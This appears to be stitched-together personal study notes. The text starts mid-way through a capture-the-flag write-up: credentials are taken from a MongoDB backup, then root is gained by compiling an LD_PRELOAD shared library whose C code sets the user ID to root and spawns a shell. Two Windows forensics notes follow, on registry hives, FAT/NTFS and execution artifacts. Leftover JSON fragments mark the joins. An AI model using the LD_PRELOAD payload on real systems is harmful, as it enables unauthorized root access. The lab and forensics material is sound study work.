user\nOnce on the box I ran the [enumerate module](https://pwncat.readthedocs.io/en/latest/enum.html) from pwncat \u0026 noticed that both mysql \u0026 mongodb are running. Trying to connect to mysql gave me nothing, thus I tried `mongo` as well. Here I found a `backup` db where it stored the password for the `webdeveloper` user\n![[write-ups/images/Pasted image 20220819194027.png]]\n\nJust connect through `ssh` \u0026 we got user\n![[write-ups/images/Pasted image 20220819194149.png]]\n\n## Getting root\nRunning pwncat `enumerate` shows us that we can execute `/usr/bin/sky_backup_utility` as root without a password\n![[write-ups/images/Pasted image 20220819194334.png]]\nSo let's try it\n![[write-ups/images/Pasted image 20220819194420.png]]\n\nSeems that it just makes a backup of the web server. We see that it's an ELF executable \u0026 that it sets the environment for `LD_PRELOAD`\n![[write-ups/images/Pasted image 20220819194757.png]]\n\nSince `LD_PRELOAD` is enabled, we can add a path to our own shared library that the loader will use before any other shared library. So we can create a simple `shell.c` in `/tmp`:\n```c\n#include \u003cstdio.h\u003e\n#include \u003csys/types.h\u003e\n#include \u003cstdlib.h\u003e\n\nvoid _init() {\n  unsetenv(\"LD_PRELOAD\");\n  setgid(0);\n  setuid(0);\n  system(\"/bin/bash\");\n}\n```\n\nRetrieve it, compile as shared library, set `LD_PRELOAD` to it \u0026 execute.\n![[write-ups/images/Pasted image 20220819195136.png]]\n\n## Refs\n- [LD_PRELOAD \u0026 LD_LIB_PATH privesc haktricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#ld_preload-and-ld_library_path)\n\n## See Also\n- [[write-ups/THM]]",

    "content": "\n- **Forensic Artifacts**: are essential pieces of information that provide evidence of human activity *(e.g during the investigation of a crime scene: fingerprints, tools used to perform the crime, etc are all considered forensic artifacts)*. Basically all the artifacts are combined to recreate the story of how the crime was committed. In the digital world, artifacts can be small footprints of activity left on the computer system\n\n## Windows Registry\n- A a collection of databases that contains the system's configuration data about the hardware, software, user's information *(e.g recently used files, programs used, devices connected)*\n- It consists of Keys and Values\n- A¬†[Registry Hive](https://docs.microsoft.com/en-us/windows/win32/sysinfo/registry-hives#:~:text=Registry Hives. A hive is a logical group,with a separate file for the user profile.)¬†is a group of Keys, subkeys, and values stored in a single file on the disk\n- more about it on the [official doc](https://docs.microsoft.com/en-US/troubleshoot/windows-server/performance/windows-registry-advanced-users)\n### Structure\n| Folder/predefined Key | Description                                                                                                                                                                                                                                                                   |\n| --------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |\n| `HKEY_CURRENT_USER`   | Contains the root of the configuration information for the user who is currently logged on. The user's folders, screen colors, and Control Panel settings are stored here. This information is associated with the user's profile. This key is sometimes abbreviated as HKCU. |\n| `HKEY_USERS`          | Contains all the actively loaded user profiles on the computer. `HKEY_CURRENT_USER` is a subkey of `HKEY_USERS`. `HKEY_USERS` is sometimes abbreviated as HKU.                                                                                                                |\n| `HKEY_LOCAL_MACHINE`  | Contains configuration information particular to the computer (for any user). This key is sometimes abbreviated as HKLM.                                                                                                                                                      |\n| `HKEY_CLASSES_ROOT`   | Is a subkey of¬†`HKEY_LOCAL_MACHINE\\Software`. The information that is stored here makes sure that the correct program opens when you open a file by using Windows Explorer. This key is sometimes abbreviated as HKCR.                                                        |\n| `HKEY_CURRENT_CONFIG` | Contains information about the hardware profile that is used by the local computer at system startup.                                                                                                                                                                         | \n\n### Accessing hives offline\nIf you only have access to a disk image, you must know where the registry hives are located on the disk. The majority of these hives are located in the¬†`C:\\Windows\\System32\\Config`¬†directory and are:\n- **DEFAULT**: `HKEY_USERS\\DEFAULT`\n- **SAM**: `HKEY_LOCAL_MACHINE\\SAM`\n- **SECURITY**: `HKEY_LOCAL_MACHINE\\Security`\n- **SOFTWARE**: `HKEY_LOCAL_MACHINE\\Software`\n- **SYSTEM**: `HKEY_LOCAL_MACHINE\\System`\n\nApart from these hives, two other hives containing user information can be found in the User profile directory *(`C:\\Users\\\u003cusername\u003e`)*:\n- `NTUSER.dat` *(mounted on `HKEY_CURRENT_USER` upon login)*\n- `USRCLASS.dat` *(mounted on `HKEY_CURRENT_USER\\Software\\CLASSES`)*\n\n\u003e **NOTE**: These are hidden files\n\nThere's also another hive called **AmCache** located in `C:\\Windows\\AppCompat\\Programs\\Amcache.hve`. Windows creates it to save information on programs that were recemtly run on the system\n\n### Transaction Logs \u0026 Backups\n¬†The transaction logs can be considered as the journal of the changelog of the registry hive. This means that thee logs can often have the latest changes in the registry that haven't made their way to the registry hives themselves.\n \n They're stored aas a `.LOG` file in the same directory as the hive itself *(e.g for the SAM hive will be located in¬†`C:\\Windows\\System32\\Config`¬†in the filename `SAM.LOG`)*\n \n Registry backups are the opposite of Transaction logs. These are the backups of the registry hives located in the¬†`C:\\Windows\\System32\\Config`¬†directory. These hives are copied to the¬†`C:\\Windows\\System32\\Config\\RegBack`¬†directory every ten days\n\n## Data Acquisition\nFor the sake of accuracy, it is recommended practice to image the system or make a copy of the required data and perform forensics on it. This is called data acquisition.\n\nWhen we go to copy the registry hives from¬†`%WINDIR%\\System32\\Config`, we cannot because it is a restricted file. For that we can use some tools:\n- [Kape](https://www.kroll.com/en/services/cyber-risk/incident-response-litigation-support/kroll-artifact-parser-extractor-kape): is a live data acquisition and analysis tool which can be used to acquire registry data\n- [Autopsy](https://www.autopsy.com/): gives you the option to acquire data from both live systems or from a disk image\n- [FTK Imager](https://www.exterro.com/ftk-imager): similar to Autopsy and allows you to extract files from a disk image or a live system by mounting the said disk image or drive in FTK Imager\n- [AccessData's Registry Viewer](https://accessdata.com/product-download/registry-viewer-2-0-0): let's you explore the regitry similar to Windows Registry Editor *(only loads one hive at a time, and it can't take the transaction logs into account)*\n- [Eric Zimmerman's Tools](https://ericzimmerman.github.io/#!index.md): handful of¬†tools¬†that are very useful for performing Digital Forensics and Incident Response\n- [RegRipper](https://github.com/keydet89/RegRipper3.0): utility that takes a registry hive as input and outputs a report that extracts data from some of the forensically important keys and values in that hive\n\n\n## System Information \u0026 Accounts\n\n- to find the OS version check the `SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion`\n\t- ![[write-ups/images/Pasted image 20220621200246.png]]\n- the hives containing the machine‚Äôs configuration data used for controlling system startup are called Control Sets. Commonly there's 2:\n\t- ControlSet001: will point to the Control Set that the machine booted with *(@ `SYSTEM\\ControlSet001`)*\n\t- ControlSet002: will be the¬†last known good¬†configuration *(@ `SYSTEM\\ControlSet002`)*\n- Windows creates a volatile Control Set when the machine is live, called the CurrentControlSet¬†(`HKLM\\SYSTEM\\CurrentControlSet`). To find out which Control et is being used a the CurrentControlSet we can look @ `SYSTEM/Select/Current`. Similary the last known good config can be found @ `SYSTEM/Select/LastKnownGood`\n- find the Computer Name from: `SYSTEM\\CurrentControlSet\\Control\\ComputerName\\ComputerName`\n- it's important to establish the time zone of the computer to better understand the chronology of events. It can be found @ `SYSTEM\\CurrentControlSet\\Control\\TimeZoneInformation`\n- **Network Interfaces \u0026 Past Networks**\n\t- the following registry key will give a list of network interfaces on the machine we are investigating: `SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters\\Interfaces`\n\t- ![[write-ups/images/Pasted image 20220621201045.png]]\n\t- each Interface is represented with a unique identifier (GUID) subkey, which contains values relating to the interface‚Äôs TCP/IP configuration. Will provide us with info like IP address, DHCP, Subnet Masks, DNS, etc\n\t- the past networks a given machine was connected to can be found in the following locations: `SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\NetworkList\\Signatures\\Unmanaged` \u0026 `SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\NetworkList\\Signatures\\Managed`\n\t- the last write time of the registry key points to the last time these networks were connected.\n- **Autoruns**\n\t- include information about programs or commands that run when a user logs on\n\t\t- `NTUSER.DAT\\Software\\Microsoft\\Windows\\CurrentVersion\\Run`\n\t\t- `NTUSER.DAT\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce`\n\n\t\t- `SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce`\n\t\t- `SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\policies\\Explorer\\Run`\n\t\t- `SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run`\n\t- information about services: `SYSTEM\\CurrentControlSet\\Services`\n\t\t- ![[write-ups/images/Pasted image 20220621201358.png]]\n\t\t- if `start` is set to `0x02` =\u003e service will start on boot\n- **SAM hive and user information**: SAM hive contains user account information, login information, and group information \u0026 is mainly located @ `SAM\\Domains\\Account\\Users`\n\n## Usage of files/folders\n- **Recent Files**: Windows maintains a list of recently opened files for each user.

    "content": "\n## File Allocation Table *(FAT)*\n- default file system for Microsoft since the late 70s\n- creates a table that indexes the location of bits that are allocated to different files\n- [wiki page](https://en.wikipedia.org/wiki/File_Allocation_Table)\n\n### Data Structures\n- **Clusters**: a basic storage unit of the FAT file system. Each file stored on a storage device can be considered a group of cluters containing bits of info\n- **Directory**: contains info about file identification *(e.g filename, starting cluster, length)*\n- **File Allocation Table**: a linked list of all clusters. Contains the status of the cluster and the pointer to the next cluster in the chain\n\n### FAT12, FAT16 \u0026 FAT32\n- the FAT file format divides the available disk space into clusters for more straightforward addressing *(the nr of clusters depends on the nr of bits used to address that cluster)*\n- hence there are multiple variations: \n\n| Attribute              | FAT12     | FAT16      | FAT32       |\n| ---------------------- | --------- | ---------- | ----------- |\n| Addressable bitss      | 12        | 16         | 28          |\n| Max nr of clusters     | 4096      | 65.536     | 268.435.456 |\n| Supported cluster size | 512 - 8KB | 2MB - 32KB | 4KB - 32KB  |\n| Max volume size        | 32MB      | 2GB        | 2TB         | \n\n- in the case of FAT32 there's only 28 bits that address the cluster because the rest is used 4 administrative purposes *(e.g store the end of cluster chain, unusable parts of the disk)*\n- chances of coming across FAT12 file systems are pretty rare nowadays, even if FAT16 \u0026 FAT32 are still used in some places *(e.g USB, SD cards, digital cams)*, becase the max file/volume size are limiting factors that reduce their usage\n\n### exFAT\n- as we started using \u0026 adopting higher resolution images and videos, the max file size of FAT32 became a substantial limiting factor for camera manufacturers\n- even if Microsoft moved to the [NTFS file system](NTFS file system), it was not suitable for digital media devices as they didn't need the added security features =\u003e manufactorers lobying Microsoft to create exFAT\n- exFAT: the default file system for SD cards larger than 32GB\n\t- supports a cluster size of 4KB - 32MB\n\t- max vol size of 128PB\n\t- reduces some of the overheads of FAT to make it lighter \u0026 more efficient\n\t- max of 2,796,202 files per dir\n\n## NTFS \n- The New Technology File System was introduced by microsoft in 1993 to address the limitations of the FAT fs *(recovery capabilities, security, reliability)* while introducing new features\n- **Journaling**: log of changes to the metadata in the volume\n\t- helps the system recover from a crash / data movement due to defragmentation\n\t- log stored in `$LOGFILE` within the volume's root dir\n- **Access Controls**: they define the owner of a file/dir \u0026 permissions for each user\n- **Volume Shadow Copy**: keeps track of changes made to a file, thus a user caan restore previous file versions 4 recovery or a system restore\n\t- it has been noted that ransware actors delete the shadow copies on a victim's computer to prevent them from recovering data\n- **Alternate Data Streams (ADS)**: allows files to have multiple streams of data stored in a single file\n\t- browsers use this feature to identify file downloaded from the internet *(uing the ADS Zone Transfer)*\n\t- also malware uses it to hide code\n\n### Master File Table *(MFT)*\n- similar to the File Allocation Table there's a more extensive Master File Table in NTFS \n- a structured db that tracks the objects stored in a volume =\u003e so the data is organized here\n- some critical MFT files 4 forensics:\n\t- `$MFT`: 1st record in a volume. The Volume Boot Record *(VBR)* points to the cluster where it's located. It stores info about the clusters where all the other objects are located. This file has a dir of all the files present on the volume\n\t- `$LOGFILE`: stores the transactional logging of the file system. Helps to maintain the integrity of fs in case of crash\n\t- `$UsnJrnl`: stands for the Update Sequence Number *(USN)* Journal. Present in the `$Extend` record \u0026 contains info about all the files changed in the fs \u0026 the reason for it *(also called the change journal)*\n- we can explore the MFT using `MFTECmd`, one of [Eric Zimmerman's tools](https://ericzimmerman.github.io/#!index.md)\u003c: `MFTECmd.exe -f \u003cpath-to-$MFT-file\u003e --csv \u003cpath-to-save-results-in-csv\u003e` then use the `EZviewer`\n\t- ![[write-ups/images/Pasted image 20220623041129.png]]\n\t- similarly parse the `$Boot` file, which will provide information about the boot sector\n\t- doesn't support `$LOGFILE` as of now\n\t- ![[write-ups/images/Pasted image 20220623041612.png]]\n- Parse the $MFT file placed in¬†`C:\\users\\THM-4n6\\Desktop\\triage\\C\\`¬†and analyze it. What is the Size of the file located at¬†`.\\Windows\\Security\\logs\\SceSetupLog.etl`?\n\t- ![[write-ups/images/Pasted image 20220623041952.png]]\n\t- or from cli\n\t- ![[write-ups/images/Pasted image 20220623042007.png]]\n- What is the size of the cluster for the volume from which this triage was taken?\n\t- ![[write-ups/images/Pasted image 20220623042049.png]]\n\t- ![[write-ups/images/Pasted image 20220623042218.png]]\n\n## Recovering Deleted Files\n- as we delete a file from the file sytstem, it just deletes the entries stored in the db that store the file's location on disk =\u003e the locaation is not available / unallocated\n- however that doesn't mean the contents of the file are gone, there are still on disk as long as they're not overwritten by the file system\n- similarly, there is data on the disk in different unallocated clusters, which can possibly be recovered\n- thus, we can recover this data by analyzing the bytes *(\u0026 understanding the file struct we're searching for)* with a hex editor or with specialized tools like [Autopsy](https://www.autopsy.com/)\n\n\u003e **NOTE**: if you want to override the file's contents on disk rendering it unavailable we can use tools like `shred` \n\n\n## Evidence of Execution\n- **Windows Prefetch files**: when a program runs on Windows, it stores its info for future use. This is used to load the program quickly in case of frequent use\n\t- stored in prefetch files which are located in the¬†`C:\\Windows\\Prefetch`¬†dir\n\t- contain the last run times of the application, the number of times the application was run, and any files and device handles used by the file =\u003e excellent source for forensics\n\t- can use Prefetch Parser from Zimmerman's tools to extract the data: `PECmd.exe -f \u003cpath-to-prefetch-files\u003e --csv \u003ccsv-output\u003e`\n- **Windows 10 Timeline**: stores recently used applications and files in an SQLite database called the Windows 10 Timeline\n\t- can be a source of information about the last executed programs\n\t- contains ¬†the application that was executed and the focus time of the application\n\t- found @ `C:\\Users\\\u003cusername\u003e\\AppData\\Local\\ConnectedDevicesPlatform\\{randomfolder}\\ActivitiesCache.db`\n\t- fetch thi data with `WxTCmd.exe` from Zimmerman's tools: `WxTCmd.exe -f \u003cpath-to-timeline-file\u003e --csv \u003cpath-to-save-csv\u003e`\n- **Windows Jump Lists**: Windows introduced jump lists to help users go directly to their recently used files from the taskbar\n\t- can view jumplists by right-clicking an application's icon in the taskbar, and it will show us the recently opened files in that application\n\t- stored @ `C:\\Users\\\u003cusername\u003e\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\AutomaticDestinations`\n\t- include information about the applications executed, first time of execution, and last time of execution of the application against an AppID\n\t- also can see with Zimmerman's tools: `JLECmd.exe -f \u003cpath-to-Jumplist-file\u003e --csv \u003cpath-to-save-csv\u003e`\n\n## File/Folder Knowledge\n- **Shortcut Files**: Windows creates a shortcut file for each file opened either locally or remotely\n\t- contain information about the first and last opened times of the file and the path of the opened file, along with some other data\n\t- can be found @ `C:\\Users\\\u003cusername\u003e\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\` \u0026 `C:\\Users\\\u003cusername\u003e\\AppData\\Roaming\\Microsoft\\Office\\Recent\\`\n\t- `LECmd.exe -f \u003cpath-to-shortcut-files\u003e --csv \u003cpath-to-save-csv\u003e` to explore it\n\t- can sometimes provide us with information about connected USB devices *(e.g ¬†volume name, type, and serial number)*\n- **IE/Edge History**: IE/Edge browsing history is that it includes files opened in the system as well, whether those files were opened using the browser or not\n\t- can be found @ `C:\\Users\\\u003cusername\u003e\\AppData\\Local\\Microsoft\\Windows\\WebCache\\WebCacheV*.dat`\n\t- files/folders accessed appear with a¬†`file:///*`¬†prefix in the IE/Edge history\n\t- can use several tools to analyze Web cache data *(e.g [Autopsy](https://www.autopsy.com/))*\n- **External Deivces/USB**: When any new device is attached to a system, information related to the setup of that device is stored in the¬†`setupapi.dev.log` @ `C:\\Windows\\inf\\`\n\n---\n\n## References\n\n## See Also\n- [[write-ups/THM]]\n- [[write-ups/thm/windows-forensics-1]]\n",
